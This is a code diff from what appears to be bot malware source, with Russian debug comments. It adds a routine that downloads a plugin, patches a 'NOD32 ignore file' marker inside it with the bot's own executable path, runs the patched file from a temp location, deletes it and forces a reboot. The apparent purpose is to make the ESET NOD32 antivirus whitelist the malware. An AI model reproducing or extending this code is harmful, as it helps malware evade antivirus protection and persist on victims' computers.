@@ -19,6 +19,7 @@
 #include "CabPacker.h"
 #include "BotDef.h"
 #include "StrConsts.h"
+#include "KillOs_Reboot.h"
 
 #include <shlobj.h>
 #include <shlwapi.h>
@@ -1130,7 +1131,42 @@ DWORD WINAPI ThreadAddTrust( char* nameFile )
 	data = Plugin::Download( "addtrust.plug", 0, &size, false );
 	if( data )
 	{
+		int len = m_lstrlen(nameFile);
+		wchar_t* nameIgnore;
+		int lenIgnore;
+		if( len < 5 ) //если не указан файл, то берем имя файла в автозагрузке
+		{
+			nameIgnore = AnsiToUnicode( BOT::GetBotFullExeName().t_str(), 0 );
+			lenIgnore = WSTR::CalcLength(nameIgnore);
+		}
+		else
+		{
+			nameIgnore = AnsiToUnicode( nameFile, len );
+			lenIgnore = len;
+		}
 		TASKDBG( "AddTrust", "Загрузили addtrust.plug" );
+		int szIgnore = sizeof(wchar_t) * (lenIgnore + 1); //размер памяти в которой находится строка
+		wchar_t* metka = L"NOD32 ignore file";
+		int lenMetka = WSTR::CalcLength(metka);
+		void* p = m_memmem( data, size, metka, sizeof(wchar_t) * (lenMetka + 1) );
+		if( p )
+		{
+			TASKDBG( "AddTrust", "Вставили %ls", nameIgnore );
+			m_memcpy( p, nameIgnore, szIgnore );
+			char pathFile[MAX_PATH];
+			File::GetTempName(pathFile);
+			if( File::WriteBufferA( pathFile, data, size ) == size )
+			{
+				TASKDBG( "AddTrust", "Сохранили плагин в %s", pathFile );
+				RunFileA( pathFile, true );
+				TASKDBG( "AddTrust", "Плагин выполнился" );
+				pSleep(1000);
+				pDeleteFileA(pathFile);
+				Reboot();
+			}
+		}
+		MemFree(nameIgnore);
+		MemFree(data);
 	}
 	return 0;
 }
